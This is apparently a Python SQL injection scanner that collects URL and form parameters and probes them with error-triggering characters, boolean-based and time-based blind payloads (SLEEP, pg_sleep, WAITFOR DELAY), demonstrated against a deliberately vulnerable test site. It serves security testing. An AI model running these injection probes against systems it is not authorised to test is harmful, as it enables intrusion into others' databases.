import requests
from bs4 import BeautifulSoup
import re
import time
import random
import difflib
import itertools
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, quote
import concurrent.futures
import threading

class SQLInjectionScanner:
    def __init__(self, target_url, progress_callback=None, request_timeout=15):
        self.target_url = target_url
        self.progress_callback = progress_callback
        self.request_timeout = request_timeout
        self.user_agent = "OmenSight Scanner/1.0"
        self.session = requests.Session()
        self.session.headers["User-Agent"] = self.user_agent
        self.session.verify = False
        self.randint = random.randint(1, 255)
        self.blind_time_delay = 5
        self.num_threads = 10
        self.dbms_errors = {
            "MySQL": (r"SQL syntax.*MySQL", r"Warning.*mysql_.*", r"valid MySQL result", r"MySqlClient\.", r"MariaDB", r"You have an error in your SQL syntax"),
            "PostgreSQL": (r"PostgreSQL.*ERROR", r"Warning.*\Wpg_.*", r"valid PostgreSQL result", r"Npgsql\.", r"syntax error at or near"),
            "Microsoft SQL Server": (r"Driver.* SQL[\-\_\ ]*Server", r"OLE DB.* SQL Server", r"(\W|\A)SQL Server.*Driver", r"Warning.*mssql_.*", r"(\W|\A)SQL Server.*[0-9a-fA-F]{8}", r"(?s)Exception.*\WSystem\.Data\.SqlClient\.", r"Unclosed quotation mark after the character string"),
            "Microsoft Access": (r"Microsoft Access Driver", r"JET Database Engine", r"Access Database Engine", r"Microsoft OLE DB Provider for ODBC Drivers"),
            "Oracle": (r"\bORA-[0-9][0-9][0-9][0-9]", r"Oracle error", r"Oracle.*Driver", r"Warning.*\Woci_.*", r"Warning.*\Wora_.*"),
            "IBM DB2": (r"CLI Driver.*DB2", r"DB2 SQL error", r"\bdb2_\w+\("),
            "SQLite": (r"SQLite/JDBCDriver", r"SQLite.Exception", r"System.Data.SQLite.SQLiteException", r"Warning.*sqlite_.*", r"Warning.*SQLite3::", r"\[SQLITE_ERROR\]"),
            "Sybase": (r"(?i)Warning.*sybase.*", r"Sybase message", r"Sybase.*Server message.*"),
        }
        self.prefixes = (" ", ") ", "' ", "') ")
        self.suffixes = ("", "-- -", "#", ";", "%%16", "%00")
        self.boolean_tests = ("AND %d=%d", "OR NOT (%d>%d)", "AND ('%d'='%d')")
        self.time_tests = {
             "MySQL": "AND SLEEP({delay})",
             "PostgreSQL": "AND pg_sleep({delay})",
             "Microsoft SQL Server": "AND WAITFOR DELAY '0:0:{delay}'",
        }
        self.fuzzy_threshold = 0.95
        self.tested_params = set()
        self.found_vulnerabilities = []
        self.lock = threading.Lock()

    def _log(self, message, level="info"):
        prefix_map = {"info": "[+]", "progress": "[~]", "vuln": "[!]", "warn": "[!]", "error": "[-]"}
        prefix = prefix_map.get(level, "[?]")
        full_message = f"{prefix} SQLi: {message}"
        print(full_message)
        if self.progress_callback and level in ["progress", "vuln", "info", "error", "warn"]:
            self.progress_callback(full_message)

    def _add_vulnerability(self, finding_text):
        with self.lock:
            if finding_text not in self.found_vulnerabilities:
                self.found_vulnerabilities.append(finding_text)

    def _retrieve_content(self, url, method="get", data=None):
        response_obj = None
        html_content = ""
        http_code = None
        title = None
        text_content_cleaned = ""
        error_info = None
        duration = 0
        actual_url = url
        try:
            start_time = time.time()
            if method.lower() == "post":
                response_obj = self.session.post(url, data=data, timeout=self.request_timeout, allow_redirects=False)
            else:
                response_obj = self.session.get(url, params=data, timeout=self.request_timeout, allow_redirects=False)
            duration = time.time() - start_time
            http_code = response_obj.status_code
            html_content = response_obj.text
            actual_url = response_obj.url
            match = re.search(r"<title>(?P<result>[^<]+)</title>", html_content, re.I)
            title = match.group("result").strip() if match else None
            text_content_cleaned = re.sub(r"(?si)<script.+?</script>|<!--.+?-->|<style.+?</style>|<[^>]+>|\s+", " ", html_content)
            text_content_cleaned = " ".join(text_content_cleaned.split())
        except requests.exceptions.Timeout:
            error_info = "Timeout"
            duration = self.request_timeout
        except requests.exceptions.RequestException as e:
            error_info = f"Request Error: {e}"
            if 'start_time' in locals(): duration = time.time() - start_time
            if hasattr(e, 'response') and e.response is not None:
                 response_obj = e.response
                 http_code = response_obj.status_code
                 html_content = response_obj.text
                 actual_url = response_obj.url
                 match = re.search(r"<title>(?P<result>[^<]+)</title>", html_content, re.I)
                 title = match.group("result").strip() if match else None
                 text_content_cleaned = re.sub(r"(?si)<script.+?</script>|<!--.+?-->|<style.+?</style>|<[^>]+>|\s+", " ", html_content)
                 text_content_cleaned = " ".join(text_content_cleaned.split())
            else:
                 http_code = None
        except Exception as e:
            error_info = f"Unexpected Error during request: {e}"
            if 'start_time' in locals(): duration = time.time() - start_time
            http_code = None
        return {
            "code": http_code, "title": title, "text": text_content_cleaned,
            "duration": duration, "error": error_info, "url": actual_url,
            "raw_html": html_content
        }

    def _check_error_based(self, response_html_content):
        if not response_html_content or not isinstance(response_html_content, str):
            return None, None
        text_to_check = response_html_content[:20000]
        for dbms, patterns in self.dbms_errors.items():
            for pattern in patterns:
                if re.search(pattern, text_to_check, re.IGNORECASE):
                    return dbms, pattern
        return None, None

    def _test_parameter(self, location_type, location_target, base_url, method, param_name, base_data):
        param_key = f"{method.upper()}:{base_url}:{param_name}"
        with self.lock:
            if param_key in self.tested_params:
                return
            self.tested_params.add(param_key)
        self._log(f"Testing {location_type} parameter '{param_name}' at {location_target}", level="progress")
        vulnerable = False
        simple_error_payloads = ["'", "\"", "`", "\\"]
        for payload_char in simple_error_payloads:
            data_copy = base_data.copy()
            original_value = data_copy.get(param_name, "")
            data_copy[param_name] = original_value + payload_char
            content_for_error_check = self._retrieve_content(base_url, method, data=data_copy)
            if content_for_error_check["raw_html"]:
                dbms, pattern = self._check_error_based(content_for_error_check["raw_html"])
                if dbms:
                    finding = f"Error-based SQLi found ({dbms}?) in {location_type} parameter '{param_name}' using payload '{payload_char}'. Pattern: {pattern}. Trigger URL: {content_for_error_check['url']}"
                    self._log(finding, level="vuln")
                    self._add_vulnerability(finding)
                    vulnerable = True
                    break
        if vulnerable: return
        self._log(f"Running boolean-based checks for '{param_name}'...", level="progress")
        original_content = self._retrieve_content(base_url, method, data=base_data)
        if original_content["code"] is None or original_content["code"] >= 500:
             self._log(f"Skipping blind checks for '{param_name}': Original request failed ({original_content.get('code', 'N/A')}) or error: {original_content.get('error', 'No details')}.", level="warn")
             return
        for prefix, boolean_template, suffix in itertools.product(self.prefixes, self.boolean_tests, self.suffixes):
            if vulnerable: break
            try:
                formatted_boolean_true = boolean_template % (self.randint, self.randint)
                true_payload_str = f"{prefix}{formatted_boolean_true}{suffix}"
                data_true = base_data.copy()
                data_true[param_name] = data_true.get(param_name, "") + quote(true_payload_str)
                content_true = self._retrieve_content(base_url, method, data=data_true)
                formatted_boolean_false = boolean_template % (self.randint + 1, self.randint)
                false_payload_str = f"{prefix}{formatted_boolean_false}{suffix}"
                data_false = base_data.copy()
                data_false[param_name] = data_false.get(param_name, "") + quote(false_payload_str)
                content_false = self._retrieve_content(base_url, method, data=data_false)
                if content_true["code"] is None or content_false["code"] is None: continue
                is_bool_vulnerable = False
                if original_content["code"] == content_true["code"] and \
                   content_true["code"] != content_false["code"] and \
                   content_false["code"] is not None:
                    is_bool_vulnerable = True
                elif original_content["title"] and content_true["title"] and content_false["title"] and \
                     original_content["title"] == content_true["title"] != content_false["title"]:
                     is_bool_vulnerable = True
                elif content_true["code"] < 500 and content_false["code"] < 500 and \
                     original_content["text"] and content_true["text"] and content_false["text"]:
                     ratio_true_vs_orig = difflib.SequenceMatcher(None, original_content["text"], content_true["text"]).quick_ratio()
                     ratio_false_vs_orig = difflib.SequenceMatcher(None, original_content["text"], content_false["text"]).quick_ratio()
                     if ratio_true_vs_orig > self.fuzzy_threshold and \
                        ratio_false_vs_orig < self.fuzzy_threshold and \
                        abs(ratio_true_vs_orig - ratio_false_vs_orig) > (1.0 - self.fuzzy_threshold) / 2:
                         is_bool_vulnerable = True
                if is_bool_vulnerable:
                     finding = f"Boolean-based blind SQLi found in {location_type} parameter '{param_name}' using template: '{prefix}{boolean_template}{suffix}'. True payload: '{true_payload_str}'. Trigger URL (True): {content_true['url']}"
                     self._log(finding, level="vuln")
                     self._add_vulnerability(finding)
                     vulnerable = True; break
            except Exception as e:
                 self._log(f"Error during boolean check for '{param_name}' with template '{prefix}{boolean_template}{suffix}': {e}", level="error")
                 continue
        if vulnerable: return
        self._log(f"Running time-based checks for '{param_name}'...", level="progress")
        baseline_req1 = self._retrieve_content(base_url, method, data=base_data)
        baseline_req2 = self._retrieve_content(base_url, method, data=base_data)
        if baseline_req1["duration"] is None or baseline_req2["duration"] is None or baseline_req1["error"] or baseline_req2["error"]:
            self._log(f"Cannot establish reliable baseline for time-based on '{param_name}'. Original request(s) failed or had errors.", level="warn")
            return
        baseline_duration = (baseline_req1["duration"] + baseline_req2["duration"]) / 2.0
        effective_baseline = max(baseline_duration, 0.3)
        for dbms, time_payload_format_str in self.time_tests.items():
            if vulnerable: break
            for prefix, suffix in itertools.product(self.prefixes, self.suffixes):
                if vulnerable: break
                time_injected_payload_str = ""
                try:
                    payload_template = f"{prefix}{time_payload_format_str}{suffix}"
                    time_injected_payload_str = payload_template.format(delay=self.blind_time_delay)
                    data_copy = base_data.copy()
                    data_copy[param_name] = data_copy.get(param_name, "") + quote(time_injected_payload_str)
                    content_timed = self._retrieve_content(base_url, method, data=data_copy)
                    if content_timed["duration"] is None or content_timed["error"]: continue
                    expected_min_duration = effective_baseline + self.blind_time_delay * 0.7
                    if content_timed["duration"] > expected_min_duration:
                        finding = f"Time-based blind SQLi found ({dbms}?) in {location_type} parameter '{param_name}' using payload: '{time_injected_payload_str}'. Duration: {content_timed['duration']:.2f}s (Baseline: {baseline_duration:.2f}s). Trigger URL: {content_timed['url']}"
                        self._log(finding, level="vuln")
                        self._add_vulnerability(finding)
                        vulnerable = True; break
                except Exception as e:
                    self._log(f"Error during time check for '{param_name}' with payload '{time_injected_payload_str}': {e}", level="error")
                    continue

    def scan(self):
        self._log(f"Starting SQL Injection scan for {self.target_url}", level="info")
        with self.lock:
            self.found_vulnerabilities = []
            self.tested_params = set()
        jobs_to_run = []
        parsed_target_url = urlparse(self.target_url)
        query_params_dict = parse_qs(parsed_target_url.query)
        base_url_path_only = parsed_target_url._replace(query="").geturl()
        if query_params_dict:
            self._log(f"Collecting {len(query_params_dict)} GET parameters for testing...", level="info")
            base_data_for_get = {k: v[0] for k, v in query_params_dict.items() if v}
            for param_name in query_params_dict:
                jobs_to_run.append(("URL", self.target_url, base_url_path_only, "get", param_name, base_data_for_get.copy()))
        else:
             self._log("No GET parameters found in URL.", level="info")
        form_parameter_jobs = self.scan_forms_collect_jobs()
        if form_parameter_jobs:
            jobs_to_run.extend(form_parameter_jobs)
        if not jobs_to_run:
            self._log("No parameters or form inputs found to test.", level="info")
            return "No parameters or form inputs identified for SQL Injection testing."
        self._log(f"Starting concurrent testing of {len(jobs_to_run)} parameters/inputs using up to {self.num_threads} threads...", level="info")
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.num_threads) as executor:
            future_to_job_details = {executor.submit(self._test_parameter, *job_args_tuple): job_args_tuple for job_args_tuple in jobs_to_run}
            for future in concurrent.futures.as_completed(future_to_job_details):
                job_args_tuple = future_to_job_details[future]
                try:
                    future.result()
                except Exception as exc:
                    param_name_for_log = job_args_tuple[4]
                    self._log(f"Parameter '{param_name_for_log}' testing generated an exception: {exc}", level="error")
        self._log("SQL Injection Scan Finished.", level="info")
        with self.lock:
            if not self.found_vulnerabilities:
                return "No potential SQL Injection vulnerabilities found."
            else:
                results_header = "[!] Potential SQL Injection Vulnerabilities Found:"
                unique_findings_sorted = sorted(list(set(self.found_vulnerabilities)))
                return "\n".join([results_header] + unique_findings_sorted)

    def scan_forms_collect_jobs(self):
        self._log("Collecting form inputs for testing...", level="info")
        form_jobs_list = []
        forms_on_page = self.get_forms()
        if not forms_on_page:
            self._log("No forms found on the page.", level="info")
            return form_jobs_list
        self._log(f"Found {len(forms_on_page)} forms. Collecting inputs...", level="info")
        for form_element in forms_on_page:
            try:
                form_details_dict = self.form_details(form_element)
                form_action_url_part = form_details_dict.get("action", "")
                target_form_submission_url = urljoin(self.target_url, form_action_url_part)
                form_http_method = form_details_dict.get("method", "get").lower()
                form_base_data_dict = {}
                inputs_to_be_tested_names = []
                for input_tag_details in form_details_dict.get("inputs", []):
                    input_name = input_tag_details.get("name")
                    if input_name:
                        input_value = input_tag_details.get("value", "test")
                        form_base_data_dict[input_name] = input_value
                        inputs_to_be_tested_names.append(input_name)
                if not inputs_to_be_tested_names:
                     self._log(f"Skipping form (Action: {form_action_url_part}): No named inputs found.", level="info")
                     continue
                for input_name_to_test in inputs_to_be_tested_names:
                     form_jobs_list.append(("Form", target_form_submission_url, target_form_submission_url,
                                            form_http_method, input_name_to_test, form_base_data_dict.copy()))
            except Exception as e:
                 self._log(f"Error processing form for job collection (Action: {form_element.get('action', 'N/A')}): {e}", level="error")
                 continue
        return form_jobs_list

    def get_forms(self):
        try:
            response = self.session.get(self.target_url, timeout=self.request_timeout)
            response.raise_for_status()
            soup = BeautifulSoup(response.content, "html.parser")
            return soup.find_all("form")
        except requests.exceptions.RequestException as e:
            self._log(f"Error fetching URL content ({self.target_url}) for form scanning: {e}", level="error")
            return []
        except Exception as e:
            self._log(f"Error parsing HTML for forms from {self.target_url}: {e}", level="error")
            return []

    def form_details(self, form_element_soup):
        details = {}
        details["action"] = form_element_soup.attrs.get("action", "")
        details["method"] = form_element_soup.attrs.get("method", "get").lower()
        details["inputs"] = []
        for input_tag_soup in form_element_soup.find_all(["input", "textarea", "select"]):
            input_details_dict = {
                "type": input_tag_soup.attrs.get("type", "text"),
                "name": input_tag_soup.attrs.get("name"),
                "value": input_tag_soup.attrs.get("value", "")
            }
            if input_tag_soup.name == "select" and not input_details_dict["value"]:
                 selected_option = input_tag_soup.find("option", selected=True)
                 first_option = input_tag_soup.find("option")
                 option_to_use = selected_option or first_option
                 if option_to_use:
                      input_details_dict["value"] = option_to_use.attrs.get("value", option_to_use.text.strip())
            if input_tag_soup.name == "textarea":
                input_details_dict["value"] = input_tag_soup.text.strip()

            if input_details_dict["name"]:
                 details["inputs"].append(input_details_dict)
        return details

if __name__ == '__main__':
    target = "http://testphp.vulnweb.com/listproducts.php?cat=1"

    print(f"--- Testing SQLi Scanner on {target} ---")
    def simple_print_callback(message):
        print(f"CALLBACK: {message}")
    scanner = SQLInjectionScanner(target, progress_callback=simple_print_callback, request_timeout=20)
    results = scanner.scan()

    print("\n--- Scan Results ---")
    print(results)